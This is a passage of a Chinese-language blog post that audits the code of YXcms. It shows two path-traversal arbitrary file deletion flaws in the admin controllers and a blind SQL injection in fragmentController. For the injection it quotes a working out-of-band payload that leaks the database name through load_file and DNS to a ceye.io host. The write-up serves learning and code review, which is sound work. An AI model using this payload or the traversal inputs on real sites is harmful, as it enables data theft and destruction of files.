+</code></pre><p>对<code>fname</code>进行替换操作<code>str_replace(&#39;,&#39;,&#39;/&#39;,$dirs);</code><br>讲参数最前面的分号(%2C)替换为<code>/</code></p>
+<p>然后完整的拼接路径，看文件是否存在，存在就进行删除。。。<br>这里没有读传入的参数进行过滤，<br>可以及逆行上跳目录，从而达到任意文件删除的效果。。。</p>
+<h2 id="任意文件删除-二"><a href="#任意文件删除-二" class="headerlink" title="任意文件删除(二)"></a>任意文件删除(二)</h2><h3 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>漏洞位置一如既往的还在后台：</p>
+<p>在对文章编辑的页面上，发现存在删除已上传的图片的功能。。<br><img src="https://s1.ax1x.com/2020/05/05/YiMl4O.png" alt="YiMl4O.png"></p>
+<p>设置抓包，点击删除：</p>
+<p><img src="https://s1.ax1x.com/2020/05/05/YiQ8oV.png" alt="YiQ8oV.png"></p>
+<p>虽然显示的是缩略图不存在，但是通过查看发现已经删除了123.txt这个文件</p>
+<p>也是存在任意文件删除</p>
+<h3 id="代码分析-3"><a href="#代码分析-3" class="headerlink" title="代码分析"></a>代码分析</h3><p>代码位置<code>/protected/apps/admin/controller/photoController.php</code></p>
+<pre><code>    public function delpic()
+    {
+        if(empty($_POST[&#39;picname&#39;])) $this-&gt;error(&#39;参数错误~&#39;);
+        $picname=$_POST[&#39;picname&#39;];
+        $path=$this-&gt;uploadpath;
+        if(file_exists($path.$picname))
+          @unlink($path.$picname);
+        else{echo &#39;图片不存在~&#39;;return;} 
+        if(file_exists($path.&#39;thumb_&#39;.$picname))
+           @unlink($path.&#39;thumb_&#39;.$picname);
+        else {echo &#39;缩略图不存在~&#39;;return;}
+        echo &#39;原图以及缩略图删除成功~&#39;;
+    }
+</code></pre><p>这个代码和上面的那个任意文件删除，差不多，都是对参数的过滤不严谨，导致可以上跳目录，删除任意文件。。。</p>
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>url:<code>/index.php?r=admin/fragment/index</code></p>
+<p><img src="https://s1.ax1x.com/2020/05/05/Yi63i8.png" alt="Yi63i8.png"></p>
+<p>利用<a href="http://ceye.io/" target="_blank" rel="noopener">ceye</a>得到的回显。。。<br>用bp抓包，修改id为  payload:<code>2 and if((select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.36rdia.ceye.io\\abc&#39;))),2,2)</code></p>
+<p><img src="https://s1.ax1x.com/2020/05/05/Yi6qOA.png" alt="Yi6qOA.png"></p>
+<p>在ceye上面可以得到回显：<br><img src="https://s1.ax1x.com/2020/05/05/YicZkV.png" alt="YicZkV.png"></p>
+<p>得到了数据库名称<code>yxcms</code></p>
+<h3 id="代码分析-4"><a href="#代码分析-4" class="headerlink" title="代码分析"></a>代码分析</h3><p>代码位置<code>protected/apps/admin/controller/fragmentController.php</code></p>
+<pre><code>    public function del()
+    {
+        if(!$this-&gt;isPost()){
+            $id=intval($_GET[&#39;id&#39;]);
+            if(empty($id)) $this-&gt;error(&#39;您没有选择~&#39;);
+            if(model(&#39;fragment&#39;)-&gt;delete(&quot;id=&#39;$id&#39;&quot;))
+            echo 1;
+            else echo &#39;删除失败~&#39;;
+        }else{
+            if(empty($_POST[&#39;delid&#39;])) $this-&gt;error(&#39;您没有选择~&#39;);
+            $delid=implode(&#39;,&#39;,$_POST[&#39;delid&#39;]);
+            if(model(&#39;fragment&#39;)-&gt;delete(&#39;id in (&#39;.$delid.&#39;)&#39;))
+            $this-&gt;success(&#39;删除成功&#39;,url(&#39;fragment/index&#39;));
+        }
+    }
+</code></pre><p>主要就是这一句话<code>if(model(&#39;fragment&#39;)-&gt;delete(&#39;id in (&#39;.$delid.&#39;)&#39;))</code></p>
+<p>追踪一下这个<code>delete</code>函数</p>
+<p>先找一下这个<code>fragmentModel</code><br>代码位置：<code>protected/apps/admin/model/fragmentModel.php</code></p>
+<pre><code>&lt;?php
+class fragmentModel extends baseModel{
+    protected $table = &#39;fragment&#39;;
+}
+</code></pre><p>发现没有任何东西，去这个<code>baseModel</code>里面找一下</p>
+<p>代码位置：<code>protected/base/model/baseModel.php</code></p>
+<pre><code>&lt;?php
+class baseModel extends model{
+     protected $prefix=&#39;&#39;;
+     public function __construct( $database= &#39;DB&#39;,$force = false ){
+        parent::__construct();
+        $this-&gt;prefix=config(&#39;DB_PREFIX&#39;);
+    }
+}
+</code></pre><p>看一下这个<code>model</code></p>
+<p>代码位置：<code>protected/base/model/model.php</code></p>
+<pre><code>    public function delete($condition){
+        return $this-&gt;model-&gt;table($this-&gt;table, $this-&gt;ignoreTablePrefix)-&gt;where($condition)-&gt;delete();
+    }
+</code></pre><p>这里又有一个<code>delete()</code>，这个应该还要找一下：</p>
+<p>位置：<code>protected/include/core/cpModel.class.php</code>,</p>
+<pre><code>    public function delete() {
+        $table = $this-&gt;options[&#39;table&#39;];    //当前表
+        $where = $this-&gt;_parseCondition();    //条件
+        if ( empty($where) ) return false; //删除条件为空时，则返回false，避免数据不小心被全部删除
+
+        $this-&gt;sql = &quot;DELETE FROM $table $where&quot;;
+        $query = $this-&gt;db-&gt;execute($this-&gt;sql);
+        return $this-&gt;db-&gt;affectedRows();
+    }
+</code></pre><p>这里也是为sql语句赋值，然后拼接sql语句的作用。。</p>
+<p>获取一下sql语句为<code>DELETE FROM yx_fragment WHERE id in (3)</code>。。。</p>
+<p>需要关注这个代码：<code>$where = $this-&gt;_parseCondition();    //条件</code></p>
+<p>代码位置：<code>protected/include/core/cpModel.class.php</code></p>
+<pre><code>    private function _parseCondition() {
+        $condition = $this-&gt;db-&gt;parseCondition($this-&gt;options);
+        $this-&gt;options[&#39;where&#39;] = &#39;&#39;;
+        $this-&gt;options[&#39;group&#39;] = &#39;&#39;;
+        $this-&gt;options[&#39;having&#39;] = &#39;&#39;;
+        $this-&gt;options[&#39;order&#39;] = &#39;&#39;;
+        $this-&gt;options[&#39;limit&#39;] = &#39;&#39;;
+        $this-&gt;options[&#39;field&#39;] = &#39;*&#39;;        
+        return $condition;        
+    }
+</code></pre><p>这里<code>$condition = $this-&gt;db-&gt;parseCondition($this-&gt;options);</code></p>
+<p>看一下<code>parseCondition</code>这个函数：</p>
+<p>位置<code>protected/include/core/db/cpMysql.class.php</code></p>
+<pre><code>    public function parseCondition($options) {
+        $condition = &quot;&quot;;
+        if(!empty($options[&#39;where&#39;])) {
+            $condition = &quot; WHERE &quot;;
+            if(is_string($options[&#39;where&#39;])) {
+                $condition .= $options[&#39;where&#39;];
+            } else if(is_array($options[&#39;where&#39;])) {
+                    foreach($options[&#39;where&#39;] as $key =&gt; $value) {
+                         $condition .= &quot; `$key` = &quot; . $this-&gt;escape($value) . &quot; AND &quot;;
+                    }
+                    $condition = substr($condition, 0,-4);    
+            } else {
+                $condition = &quot;&quot;;
+            }
+        }
+
+        if( !empty($options[&#39;group&#39;]) &amp;&amp; is_string($options[&#39;group&#39;]) ) {
+            $condition .= &quot; GROUP BY &quot; . $options[&#39;group&#39;];
+        }
+        if( !empty($options[&#39;having&#39;]) &amp;&amp; is_string($options[&#39;having&#39;]) ) {
+            $condition .= &quot; HAVING &quot; .  $options[&#39;having&#39;];
+        }
+        if( !empty($options[&#39;order&#39;]) &amp;&amp; is_string($options[&#39;order&#39;]) ) {
+            $condition .= &quot; ORDER BY &quot; .  $options[&#39;order&#39;];
+        }
+        if( !empty($options[&#39;limit&#39;]) &amp;&amp; (is_string($options[&#39;limit&#39;]) || is_numeric($options[&#39;limit&#39;])) ) {
+            $condition .= &quot; LIMIT &quot; .  $options[&#39;limit&#39;];
+        }
+        if( empty($condition) ) return &quot;&quot;;
+        return $condition;
+    }
+</code></pre><p>大部分代码都是为变量赋值的，<br>里面有一句代码<code>escape($value)</code>  应该是一个过滤函数</p>
+<p>查看一下这个函数<code>escape</code></p>
+<pre><code>    //数据过滤
+    public function escape($value) {
+        if( isset($this-&gt;_readLink) ) {
+            $link = $this-&gt;_readLink;
+        } elseif( isset($this-&gt;_writeLink) ) {
+            $link = $this-&gt;_writeLink;
+        } else {
+            $link = $this-&gt;_getReadLink();
+        }
+
+        if( is_array($value) ) { 
+           return array_map(array($this, &#39;escape&#39;), $value);
+        } else {
+           if( get_magic_quotes_gpc() ) {
+               $value = stripslashes($value);
+           } 
+            return    &quot;&#39;&quot; . mysql_real_escape_string($value, $link) . &quot;&#39;&quot;;
+        }
+    }
+</code></pre><p>发现只有当我们传入的值为数组的时候，会对数组中的每个参数进行<code>mysql_real_escape_string()</code>函数进行处理。</p>
+<p>sql语句为<code>DELETE FROM yx_fragment WHERE id in ($id)</code></p>
+<p>由于注入语句并没有单引号包裹，所以说可以直接进行注入，</p>
+<p>但是没有页面的回显，可以利用<code>ceye</code>平台进行注入，在那里可以看到注入的回显。进行sql注入。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>第一次审计一个cms，虽然这是一个入门级的cms，比较简单，但是也从中学到了点知识。。。</p>
+<p>审计代码要有耐心。。。找函数的时候直接用<code>Seay源码审计系统</code>中的全局搜索比较方便，自己乱找的话，心态会崩。。。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.secshi.com/18986.html" target="_blank" rel="noopener">https://www.secshi.com/18986.html</a><br><a href="http://ceye.io/" target="_blank" rel="noopener">ceye</a><br><a href="https://xz.aliyun.com/t/2734#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/2734#toc-0</a></p>
+
+                <hr>
+                <div>
+                    <p>
+                         
+                        <span class="badge badge-light">#&nbsp;代码审计</span>
+                        &nbsp;
+                        
+                    </p>
+                </div>
+                <br>
+                
+            </div>
+        </div>
+        <div class="d-none d-md-block col-md-2">
+            
+  <div id="toc" class="py-5">
+    <p class="h6"><i class="iconfont icon-toc" style="vertical-align:middle"></i> Toc:</p> 
+    <div id="tocbot"></div>
+  </div>
+
+        </div>
+    </div>        
+</div>
+
+<br><br><br>
+
+<!-- Comments -->
+<div class="comments" id="comments">
+ 
+</div>
+  
+  </main>
+
+<footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank"><b>HEXO</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
+  </div>
+</footer>
+
+  <!-- SCRIPTS -->
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/jquery-3.3.1.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/popper.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/bootstrap.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/mdb.min.js"></script>
+  <script src="/js/main.js"></script>
+  
+    
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    
+    <script src="/js/post.js"></script>
+    
+      <script src="/js/plugins/prettify.js"></script>
+      <script>
+          $(document).ready(function(){
+              $('pre').addClass('prettyprint linenums');
+              prettyPrint();
+          })
+      </script>
+    
+  
+</body>
+</html>
